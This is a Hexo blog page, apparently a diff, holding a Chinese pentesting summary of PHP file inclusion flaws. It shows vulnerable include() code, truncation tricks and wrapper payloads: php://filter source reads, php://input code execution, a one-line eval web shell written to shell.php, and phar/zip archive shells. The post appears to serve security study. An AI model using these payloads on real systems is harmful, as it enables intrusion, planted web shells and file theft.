@@ -1,0 +1,1226 @@
+<!DOCTYPE html>
+
+
+
+
+<html class="theme-next mist" lang="zh-CN">
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.ico?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.ico?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.ico?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="渗透测试,Web安全,文件包含,">
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="不如茶酒伴" type="application/atom+xml">
+
+
+
+
+
+
+<meta name="description" content="文件包含包含操作是指大多数语言提供的功能常见如下:">
+<meta name="keywords" content="渗透测试,Web安全,文件包含">
+<meta property="og:type" content="article">
+<meta property="og:title" content="文件包含漏洞小结">
+<meta property="og:url" content="https://0xp1n3.github.io/2018/08/09/safe-include/index.html">
+<meta property="og:site_name" content="不如茶酒伴">
+<meta property="og:description" content="文件包含包含操作是指大多数语言提供的功能常见如下:">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:updated_time" content="2019-03-18T12:05:00.586Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="文件包含漏洞小结">
+<meta name="twitter:description" content="文件包含包含操作是指大多数语言提供的功能常见如下:">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Mist',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"always","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":false,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="https://0xp1n3.github.io/2018/08/09/safe-include/">
+
+
+
+
+
+  <title>文件包含漏洞小结 | 不如茶酒伴</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope="" itemtype="http://schema.org/WebPage" lang="zh-CN">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope="" itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">不如茶酒伴</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">你看，那个人好奇怪哦！是啊，好像一条狗！</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
+            
+            About
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            Tags
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
+            
+            Categories
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            Archives
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br>
+            
+            Search
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off" placeholder="Searching..." spellcheck="false" type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://0xp1n3.github.io/2018/08/09/safe-include/">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="p1n3">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/uploads/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="不如茶酒伴">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">文件包含漏洞小结</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-08-09T04:32:52-07:00">
+                八月 09,2018
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing">
+                  <a href="/categories/Web安全/" itemprop="url" rel="index">
+                    <span itemprop="name">Web安全</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h2 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h2><p>包含操作是指大多数语言提供的功能<br>常见如下:<br><a id="more"></a></p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">include</span> <span class="string">"config.php"</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight jsp"><table><tr><td class="code"><pre><span class="line">&lt;include file=<span class="string">"header.jsp"</span>/&gt;</span><br></pre></td></tr></table></figure>
+<p>包含漏洞在php中经常出现，但并不意味着只在php中出现</p>
+<h2 id="文件包含漏洞成因"><a href="#文件包含漏洞成因" class="headerlink" title="文件包含漏洞成因"></a>文件包含漏洞成因</h2><p>代码重用时经常进行文件包含，如果参数暴露可控<br>通过恶意操作，可以达到攻击的目的</p>
+<h2 id="文件包含相关函数"><a href="#文件包含相关函数" class="headerlink" title="文件包含相关函数"></a>文件包含相关函数</h2><ul>
+<li>include</li>
+<li>include_once</li>
+<li>require</li>
+<li>require_once</li>
+</ul>
+<p>前两者遇到错误会继续,后两者会报错退出</p>
+<h2 id="文件包含类型"><a href="#文件包含类型" class="headerlink" title="文件包含类型"></a>文件包含类型</h2><h3 id="LFI-本地文件包含"><a href="#LFI-本地文件包含" class="headerlink" title="LFI 本地文件包含"></a>LFI 本地文件包含</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    define(<span class="string">'ROOT'</span>,dirname(<span class="keyword">__FILE__</span>).<span class="string">'/'</span>);</span><br><span class="line">	$mod = $_GET[<span class="string">'mod'</span>];</span><br><span class="line">	<span class="keyword">echo</span> ROOT.$mod.<span class="string">'.php'</span>;</span><br><span class="line">	<span class="keyword">include</span>(ROOT.$mod.<span class="string">'.php'</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<h3 id="RFI-远程文件包含"><a href="#RFI-远程文件包含" class="headerlink" title="RFI 远程文件包含"></a>RFI 远程文件包含</h3><p>要求</p>
+<ul>
+<li>allow_url_include = ON</li>
+<li>allow_url_fopen = ON</li>
+</ul>
+<p>包含文件并解析成PHP，如果fopen为OFF，需要伪协议才能包含</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="keyword">include</span>($_GET[<span class="string">'url'</span>]);    </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<h2 id="文件包含截断技术"><a href="#文件包含截断技术" class="headerlink" title="文件包含截断技术"></a>文件包含截断技术</h2><p>开发者常用这样的语句进行文件类型的限定</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">include</span>($mod.<span class="string">'.php'</span>);</span><br></pre></td></tr></table></figure>
+<p>导致无法包含指定文件</p>
+<h3 id="00截断"><a href="#00截断" class="headerlink" title="%00截断"></a>%00截断</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> 截断条件</span></span><br><span class="line"><span class="comment"> 无GPC,addslashes过滤</span></span><br><span class="line"><span class="comment"> php &lt;=5.3.40</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">?mod=<span class="number">2.</span>txt%<span class="number">00</span></span><br></pre></td></tr></table></figure>
+<h3 id="路径长度截断"><a href="#路径长度截断" class="headerlink" title="路径长度截断"></a>路径长度截断</h3><ul>
+<li>Windows下目录最大长度为256字节，超出的部分会被丢弃；</li>
+<li>Linux下目录最大长度为4096字节，超出的部分会被丢弃。<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> 截断条件</span></span><br><span class="line"><span class="comment"> php &lt;=5.3</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">php??mod=<span class="number">2.</span>txt..............</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<h3 id="‘-’问号伪截断-RFI"><a href="#‘-’问号伪截断-RFI" class="headerlink" title="‘?’问号伪截断 RFI"></a>‘?’问号伪截断 RFI</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">php?filename=http://127.0.0.1/FI/php.txt?.php</span><br></pre></td></tr></table></figure>
+<h3 id="号空格截断"><a href="#号空格截断" class="headerlink" title="#号空格截断"></a>#号空格截断</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">php?filename=http://127.0.0.1/FI/php.txt%23</span><br><span class="line">%20</span><br></pre></td></tr></table></figure>
+<h3 id="php-input截断"><a href="#php-input截断" class="headerlink" title="php://input截断"></a>php://input截断</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1.php?a=php://input</span><br><span class="line"></span><br><span class="line">POST</span><br><span class="line">&lt;?php phpinfo();?&gt;</span><br></pre></td></tr></table></figure>
+<h2 id="附录-PHP伪协议"><a href="#附录-PHP伪协议" class="headerlink" title="附录:PHP伪协议"></a>附录:PHP伪协议</h2><blockquote>
+<h3 id="php-filter（本地磁盘文件进行读取）"><a href="#php-filter（本地磁盘文件进行读取）" class="headerlink" title="php://filter（本地磁盘文件进行读取）"></a>php://filter（本地磁盘文件进行读取）</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt; ?filename=php://filter/convert.base64-encode/resource=xxx.php</span><br><span class="line">&gt; ?filename=php://filter/read=convert.base64-encode/resource=xxx.php</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>
+</blockquote>
+<blockquote>
+<h3 id="php-input-post"><a href="#php-input-post" class="headerlink" title="php://input(post)"></a>php://input(post)</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt; ?file=php://input</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>
+</blockquote>
+<blockquote>
+<h3 id="php-input（写shell）"><a href="#php-input（写shell）" class="headerlink" title="php://input（写shell）"></a>php://input（写shell）</h3><p>三个条件</p>
+<ul>
+<li>allow_url_fopen on</li>
+<li>allow_url_include on</li>
+<li>满足php&lt;5.3.0</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt; &lt;?PHP fputs(fopen(&apos;shell.php&apos;,&apos;w&apos;),&apos;&lt;?php @eval($_POST[cmd])?&gt;&apos;);?&gt;</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>
+</blockquote>
+<blockquote>
+<h3 id="php-input（命令执行）"><a href="#php-input（命令执行）" class="headerlink" title="php://input（命令执行）"></a>php://input（命令执行）</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt; post</span><br><span class="line">&gt; </span><br><span class="line">&gt; &lt;?php system(&apos;whoami&apos;);?&gt;</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>
+</blockquote>
+<blockquote>
+<h3 id="file-伪协议（读取文件内容）"><a href="#file-伪协议（读取文件内容）" class="headerlink" title="file://伪协议（读取文件内容）"></a>file://伪协议（读取文件内容）</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt; php?filename=file://c:/boot.ini</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>
+</blockquote>
+<blockquote>
+<h3 id="data-伪协议"><a href="#data-伪协议" class="headerlink" title="data://伪协议"></a>data://伪协议</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt;  data://text/plain;base64,dGhlIHVzZXIgaXMgYWRtaW4</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>
+</blockquote>
+<blockquote>
+<h3 id="data-读取文件"><a href="#data-读取文件" class="headerlink" title="data://(读取文件)"></a>data://(读取文件)</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt; data://text/plain;base64,SSBsb3ZlIFBIUAo=</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>
+</blockquote>
+<blockquote>
+<h3 id="phar-伪协议"><a href="#phar-伪协议" class="headerlink" title="phar://伪协议"></a>phar://伪协议</h3><ul>
+<li>PHP &gt;= 5.3.0 </li>
+<li>压缩包需要是zip协议压缩</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&gt; <span class="number">1.</span>写一个一句话木马文件shell.php，</span><br><span class="line">&gt; <span class="number">2.</span>用zip协议压缩为shell.zip，</span><br><span class="line">&gt; <span class="number">3.</span>将后缀改为png等其他格式</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>
+</blockquote>
+<blockquote>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt; ?file=phar://压缩包/内部文件 </span><br><span class="line">&gt; ?file=phar://xxx.png/shell.php</span><br><span class="line">&gt; # 改为其他任意格式的文件都可以正常使用 </span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>
+</blockquote>
+<blockquote>
+<h3 id="zip-伪协议"><a href="#zip-伪协议" class="headerlink" title="zip://伪协议"></a>zip://伪协议</h3><ul>
+<li>PHP &gt;= 5.3.0</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt; ?file=zip://[压缩文件绝对路径]#[压缩文件内的子文件名] zip://xxx.png#shell.php</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>
+</blockquote>
+<blockquote>
+<p>注意在windows下测试要5.3.0&lt;PHP&lt;5.4 才可以 #在浏览器中要编码为%23，否则浏览器默认不会传输特殊字符。</p>
+</blockquote>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <div>
+      
+        <div>
+    
+        <div style="text-align:center;color: #ccc;font-size:14px;">-------------本文结束,感谢您的阅读-------------</div>
+    
+</div>
+      
+    </div>
+    
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/渗透测试/" rel="tag"><i class="fa fa-tag"></i> 渗透测试</a>
+          
+            <a href="/tags/Web安全/" rel="tag"><i class="fa fa-tag"></i> Web安全</a>
+          
+            <a href="/tags/文件包含/" rel="tag"><i class="fa fa-tag"></i> 文件包含</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2018/07/24/hexo-config/" rel="next" title="HEXO配置教程(Next.Mist主题)">
+                <i class="fa fa-chevron-left"></i> HEXO配置教程(Next.Mist主题)
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2018/09/09/safe-command-exec/" rel="prev" title="命令执行那些事">
+                命令执行那些事 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image" src="/uploads/avatar.jpg" alt="p1n3">
+            
+              <p class="site-author-name" itemprop="name">p1n3</p>
+              <p class="site-description motion-element" itemprop="description">何人的归宿是星辰大海?</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">14</span>
+                  <span class="site-state-item-name">posts</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">7</span>
+                  <span class="site-state-item-name">categories</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">15</span>
+                  <span class="site-state-item-name">tags</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+            <div class="feed-link motion-element">
+              <a href="/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/sherdh" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-github"></i>GitHub</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="http://mail.qq.com/cgi-bin/qm_share?t=qm_mailme&email=sherdh@qq.com" target="_blank" title="E-Mail">
+                      
+                        <i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-inline">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                Links
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://gh0st.cn/" title="gh0st" target="_blank">gh0st</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://quyunjie.cn/" title="quyunjie" target="_blank">quyunjie</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://chybeta.github.io/" title="chybeta" target="_blank">chybeta</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://rcoil.me/" title="Rcoll" target="_blank">Rcoll</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://yulige.top/" title="郁离歌" target="_blank">郁离歌</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#文件包含"><span class="nav-number">1.</span> <span class="nav-text">文件包含</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#文件包含漏洞成因"><span class="nav-number">2.</span> <span class="nav-text">文件包含漏洞成因</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#文件包含相关函数"><span class="nav-number">3.</span> <span class="nav-text">文件包含相关函数</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#文件包含类型"><span class="nav-number">4.</span> <span class="nav-text">文件包含类型</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#LFI-本地文件包含"><span class="nav-number">4.1.</span> <span class="nav-text">LFI 本地文件包含</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#RFI-远程文件包含"><span class="nav-number">4.2.</span> <span class="nav-text">RFI 远程文件包含</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#文件包含截断技术"><span class="nav-number">5.</span> <span class="nav-text">文件包含截断技术</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#00截断"><span class="nav-number">5.1.</span> <span class="nav-text">%00截断</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#路径长度截断"><span class="nav-number">5.2.</span> <span class="nav-text">路径长度截断</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#‘-’问号伪截断-RFI"><span class="nav-number">5.3.</span> <span class="nav-text">‘?’问号伪截断 RFI</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#号空格截断"><span class="nav-number">5.4.</span> <span class="nav-text">#号空格截断</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#php-input截断"><span class="nav-number">5.5.</span> <span class="nav-text">php://input截断</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#附录-PHP伪协议"><span class="nav-number">6.</span> <span class="nav-text">附录:PHP伪协议</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#php-filter（本地磁盘文件进行读取）"><span class="nav-number">6.1.</span> <span class="nav-text">php://filter（本地磁盘文件进行读取）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#php-input-post"><span class="nav-number">6.2.</span> <span class="nav-text">php://input(post)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#php-input（写shell）"><span class="nav-number">6.3.</span> <span class="nav-text">php://input（写shell）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#php-input（命令执行）"><span class="nav-number">6.4.</span> <span class="nav-text">php://input（命令执行）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#file-伪协议（读取文件内容）"><span class="nav-number">6.5.</span> <span class="nav-text">file://伪协议（读取文件内容）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#data-伪协议"><span class="nav-number">6.6.</span> <span class="nav-text">data://伪协议</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#data-读取文件"><span class="nav-number">6.7.</span> <span class="nav-text">data://(读取文件)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#phar-伪协议"><span class="nav-number">6.8.</span> <span class="nav-text">phar://伪协议</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#zip-伪协议"><span class="nav-number">6.9.</span> <span class="nav-text">zip://伪协议</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">p1n3</span>
+
+  
+</div>
+
+
+
+
+
+
+  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Mist</a></div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
